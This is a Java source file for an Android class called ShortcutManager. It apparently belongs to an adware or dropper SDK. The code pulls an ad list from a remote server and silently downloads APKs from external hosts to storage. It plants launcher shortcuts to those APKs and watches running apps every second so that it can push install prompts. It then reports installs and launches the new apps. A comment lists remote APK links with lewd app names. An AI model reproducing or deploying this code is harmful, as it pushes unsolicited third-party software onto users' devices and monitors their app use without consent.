package workspace.shortcut;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import org.json.JSONArray;
import org.json.JSONException;
import workspace.bean.App;
import workspace.bean.Json;
import workspace.callback.DownloadCallback;
import workspace.callback.RequestCallback;
import workspace.util.CommonUtils;
import workspace.util.Constants;
import workspace.util.ReportUtils;
import workspace.util.RequestUtils;
import android.app.ActivityManager;
import android.app.NotificationManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.ProviderInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

public class ShortcutManager {
    private static String PREF_APP_HINT_INSTALL_TODO = "plgdlappsp";
    public static void checkTask(Context context, String appId) {
        CONTEXT = context;
        PREF_KEY = appId;
        saveDataToPref();
        startLoopCheck();
        SharedPreferences pref = context.getSharedPreferences(Constants.PREF_KEY, 0);
        String localData = pref.getString(Constants.AP_PATH_TAG, "");
        if (ShortcutManager.isTime(Constants.PREF_KEY, context) || localData.equals("")) {
            ShortcutManager.request(context, appId);
        } else {
            try {
                handleList(Json.optList(App.class, new JSONArray(localData)));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        ShortcutManager.request(CONTEXT);
    }
    static void a(final Context context, final List<App> list) {
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                int index1 = 0;
                int index2 = 0;
                while (!list.isEmpty() && index2 != 5) {
                    String packageName = list.get(index2).packageName;
                    String url = list.get(index2).appUrl;
                    String fileName = url.substring(1 + url.lastIndexOf("/"), url.length());
                    try {
                        if (!ShortcutManager.isInstalled(context, packageName)) {
                            File file = new File(Environment.getExternalStorageDirectory(), fileName);
                            final int myId = index2;
                            RequestUtils.download(url, file, new DownloadCallback() {
                                @Override
                                public void onResult(File file, Throwable error) {
                                    if (file != null) {
                                        ShortcutManager.save2Local(context, list.get(myId));
                                    }
                                }
                            });
                            index1++;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (index1 > 5) { return; }
                    index2++;
                }
            }
        }.start();
    }
    static void request(final Context context, final String appId) {
        new Thread() {
            @Override
            public void run() {
                String url = Constants.getAdsListUrl(context, appId, "1", "ad");
                RequestUtils.get(url, new RequestCallback() {
                    @Override
                    public void onResult(String content, Throwable error) {
                        if (content.length() > 0) {
                            if (content.contains("[")) {
                                content = content.substring(content.indexOf("["), 1 + content.lastIndexOf("]"));
                            }
                            Editor editor = context.getSharedPreferences(Constants.PREF_KEY, 0).edit();
                            editor.putString(Constants.AP_PATH_TAG, content);
                            editor.commit();
                            try {
                                handleList(Json.optList(App.class, new JSONArray(content)));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                });
            }
        }.start();
    }
    private static void downloadIcon(Context context, App bean, String filePath) {
        try {
            HttpURLConnection httpurlconnection = (HttpURLConnection) new URL(bean.iconUrl).openConnection();
            httpurlconnection.connect();
            Bitmap bitmap = BitmapFactory.decodeStream(httpurlconnection.getInputStream());
            installShortcut(context, bean.name, bitmap, filePath);
            return;
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }
    private static String getAuthority(Context context, String permissionName) {
        if (permissionName == null) { return null; }
        List<PackageInfo> list = context.getPackageManager().getInstalledPackages(8);
        if (list != null) {
            Iterator<PackageInfo> iterator = list.iterator();
            while (iterator.hasNext()) {
                ProviderInfo aproviderinfo[] = iterator.next().providers;
                if (aproviderinfo != null) {
                    int i = 0;
                    while (i < aproviderinfo.length) {
                        ProviderInfo providerinfo = aproviderinfo[i];
                        if (permissionName.equals(providerinfo.readPermission)) { return providerinfo.authority; }
                        if (permissionName.equals(providerinfo.writePermission)) { return providerinfo.authority; }
                        i++;
                    }
                }
            }
        }
        return null;
    }
    private static boolean has(Context context, String name) {
        ContentResolver contentresolver = context.getContentResolver();
        String authority = getAuthority(context, "com.android.launcher.permission.READ_SETTINGS");
        Cursor cursor = contentresolver.query(Uri.parse(new StringBuilder("content://").append(authority).append("/favorites?notify=true").toString()), new String[] { "title",
                "iconResource" }, "title=?", new String[] { name }, null);
        return cursor != null && cursor.getCount() > 0;
    }
    private static void installShortcut(final Context paramContext, final List<App> list) {
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                for (int i = 0; i < list.size(); i++) {
                    if (!ShortcutManager.has(paramContext, list.get(i).name)) {
                        if (list.get(i).isApk.equals("1")) {
                            try {
                                Intent intent = new Intent();
                                intent.addFlags(0x10000000);
                                intent.setAction("android.intent.action.VIEW");
                                intent.setData(Uri.parse(list.get(i).appUrl));
                                Intent intent1 = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
                                intent1.putExtra("android.intent.extra.shortcut.NAME", list.get(i).name);
                                intent1.putExtra("android.intent.extra.shortcut.INTENT", intent);
                                intent1.putExtra("android.intent.extra.shortcut.ICON", RequestUtils.getRemoteBitmpa(list.get(i).iconUrl));
                                intent1.putExtra("duplicate", false);
                                paramContext.sendBroadcast(intent1);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } else {
                            String url = list.get(i).appUrl;
                            File file = new File(Environment.getExternalStorageDirectory(), url.substring(1 + url.lastIndexOf("/"), url.length()));
                            final int index = i;
                            RequestUtils.download(url, file, new DownloadCallback() {
                                @Override
                                public void onResult(File file, Throwable error) {
                                    if (file != null) {
                                        ShortcutManager.downloadIcon(paramContext, list.get(index), file.getAbsolutePath());
                                    }
                                }
                            });
                        }
                    }
                }
            }
        }.start();
    }
    private static void installShortcut(Context context, String jsonArray) {
        try {
            JSONArray array = new JSONArray(jsonArray);
            List<App> list = Json.optList(App.class, array);
            installShortcut(context, list);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    private static void installShortcut(Context context, String s, Bitmap bitmap, String filePath) {
        Intent intent = new Intent();
        intent.addFlags(0x10000000);
        intent.setAction("android.intent.action.VIEW");
        intent.setDataAndType(Uri.fromFile(new File(filePath)), "application/vnd.android.package-archive");
        Intent intent1 = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        intent1.putExtra("android.intent.extra.shortcut.NAME", s);
        intent1.putExtra("android.intent.extra.shortcut.INTENT", intent);
        intent1.putExtra("android.intent.extra.shortcut.ICON", bitmap);
        intent1.putExtra("duplicate", false);
        context.sendBroadcast(intent1);
    }
    static boolean isInstalled(Context context, String packageName) {
        Iterator<PackageInfo> iterator = context.getPackageManager().getInstalledPackages(8192).iterator();
        do {
            if (!iterator.hasNext()) { return false; }
        } while (!iterator.next().packageName.equals(packageName));
        return true;
    }
    protected static boolean isTime(String paramString, Context paramContext) {
        SharedPreferences localSharedPreferences = paramContext.getSharedPreferences(paramString, 0);
        long l1 = localSharedPreferences.getLong("preTime", 0L);
        long l2 = Math.abs(System.currentTimeMillis() - l1) / 60000L;
        int i = localSharedPreferences.getInt("times", 0);
        boolean bool1 = l2 < 5L;
        boolean bool2 = false;
        if (!bool1) {
            SharedPreferences.Editor localEditor = localSharedPreferences.edit();
            localEditor.putLong("preTime", System.currentTimeMillis());
            localEditor.putInt("times", i + 1);
            localEditor.commit();
            bool2 = true;
        }
        return bool2;
    }
    private static void save2Local(Context context, App app) {
        SharedPreferences pref = context.getSharedPreferences(PREF_APP_HINT_INSTALL_TODO, 0);
        pref.edit().putString(app.packageName, app.id + "," + app.packageName + "," + app.name + "," + app.appUrl).commit();
    }
    static void request(final Context context) {
        new Thread() {
            @Override
            public void run() {
                RequestUtils.get(Constants.ADS_URL, new RequestCallback() {
                    @Override
                    public void onResult(String content, Throwable error) {
                        //{"ads":[{"name":"乐视频","icon":"http://pic.iuiss.com/xinlogo/dfgred.jpg","appurl":"http://apk.iuiss.com/niuniu/296187.apk","isapk":"1"},{"name":"少女私密","icon":"http://pic.leapp.cc/logo/fdeww.jpg","appurl":"http://apk.iuiss.com/niuniu/xp01_.apk","isapk":"1"},{"name":"搞你妹","icon":"http://pic.iuiss.com/xinlogo/efrgsref.jpg","appurl":"http://apk.iuiss.com/niuniu/g600026.apk","isapk":"1"}],"size":3}
                        if (content.length() > 0) {
                            String s1 = content.substring(content.indexOf("["), 1 + content.lastIndexOf("]"));
                            installShortcut(context, s1);
                        }
                    }
                });
            }
        }.start();
    }
    static void startActivity(Context context, String packageName) {
        context.startActivity(context.getPackageManager().getLaunchIntentForPackage(packageName));
    }
    private static Context CONTEXT;
    private static String PREF_KEY;
    private static Handler HANDLER = new Handler() {
        @Override
        public void handleMessage(Message message) {
            switch (message.what) {
                case 1:
                    @SuppressWarnings("unchecked")
                    List<App> list = (List<App>) message.obj;
                    ShortcutManager.a(CONTEXT, list);
                    return;
                case 2:
                    String as[] = ((String) message.obj).split(",");
                    String filePath = as[0];
                    String packageName = as[1];
                    String appName = as[2];
                    InstallDialog dialog = new InstallDialog(CONTEXT);
                    dialog.check(CONTEXT, new File(filePath), packageName, appName);
                    return;
            }
        }
    };
    public static void handleList(final List<App> list) {
        Message message = Message.obtain();
        message.what = 1;
        message.obj = list;
        HANDLER.sendMessage(message);
    }
    private static void hintInstall(String s) {
        Message message = Message.obtain();
        message.what = 2;
        message.obj = s;
        HANDLER.sendMessage(message);
    }
    private static void startLoopCheck() {
        new Thread() {
            @Override
            public void run() {
                int size = 0;
                while (true) {
                    ActivityManager manager = (ActivityManager) CONTEXT.getSystemService("activity");
                    List<RunningTaskInfo> list = manager.getRunningTasks(1000);
                    ComponentName componentname = manager.getRunningTasks(1).get(0).topActivity;
                    if (list.size() <= size || isBlackPackage(componentname.getPackageName())) {
                        size = list.size();
                    } else {
                        size = list.size();
                        SharedPreferences pref = CONTEXT.getSharedPreferences(Constants.PREF_KEY, 0);
                        long preTime = pref.getLong(Constants.CHECK_PRE_TIME_TAG, 0L);
                        long current = System.currentTimeMillis();
                        if (Math.abs(current - preTime) / 1000L > 5L) {
                            Editor editor = pref.edit();
                            editor.putLong(Constants.CHECK_PRE_TIME_TAG, current);
                            editor.commit();
                            try {
                                Thread.sleep(2000L);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            SharedPreferences pref2 = CONTEXT.getSharedPreferences(PREF_APP_HINT_INSTALL_TODO, 0);
                            Map<String, ?> map = pref2.getAll();
                            if (map.size() > 0) {
                                int random = new Random().nextInt(5);
                                int j = 0;
                                for (String packagename : map.keySet()) {
                                    if (j < random) {
                                        j++;
                                    } else {
                                        String data[] = ((String) map.get(packagename)).split(",");
                                        String appName = data[2];
                                        String url = data[3];
                                        String absolutePath = new File(Environment.getExternalStorageDirectory(), url.substring(1 + url.lastIndexOf("/"), url.length()))
                                                .getAbsolutePath();
                                        hintInstall(absolutePath + "," + packagename + "," + appName);
                                        return;
                                    }
                                }
                            }
                        }
                        size = list.size();
                    }
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }
    private static boolean isBlackPackage(String s) {
        ArrayList<String> blackList = new ArrayList<String>();
        blackList.add("com.android.");
        blackList.add("com.example.servicedemo");
        blackList.add("com.sec.");
        blackList.add("com.wandoujia.");
        blackList.add("com.samsung.");
        blackList.add("com.htc.launcher");
        blackList.add("com.android.packageinstaller");
        blackList.add("com.qihoo360.");
        blackList.add("com.legame.sybbvideo1");
        try {
            blackList.add(CONTEXT.getPackageManager().getPackageInfo(CONTEXT.getPackageName(), 0).packageName);
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (String packageName : blackList) {
            if (s.contains(packageName) || s.equals("android")) { return true; }
        }
        return false;
    }
    private static void saveDataToPref() {
        SharedPreferences sharedpreferences = CONTEXT.getSharedPreferences("plginitsp", 0);
        android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
        if (sharedpreferences.getBoolean("isFirst", true)) {
            editor.putLong("preTime", System.currentTimeMillis());
            editor.putBoolean("isFirst", false);
            editor.putInt("times", 0);
            editor.remove(PREF_KEY);
            editor.putString("appid", PREF_KEY);
            editor.putInt(Constants.INSTALL_MONTH_TAG, 1 + CommonUtils.getMonth());
            editor.putInt(Constants.INSTALL_DAY_TAG, CommonUtils.getDate());
            editor.commit();
        }
    }
    public static void hanldePackageInstalled(Context context, Intent intent) {
        SharedPreferences pref = context.getSharedPreferences(PREF_APP_HINT_INSTALL_TODO, 0);
        Map<String, ?> hashmap = pref.getAll();
        String packageName = intent.getDataString().substring(8);
        for (String key : hashmap.keySet()) {
            String notificationId = ((String) hashmap.get(key)).split(",")[0];
            if (key.equals(packageName)) {
                pref.edit().remove(key).commit();
                ((NotificationManager) context.getSystemService("notification")).cancel(Integer.parseInt(notificationId));
                ReportUtils.apkInstalledReport();
                ShortcutManager.startActivity(context, key);
                return;
            }
        }
    }
}
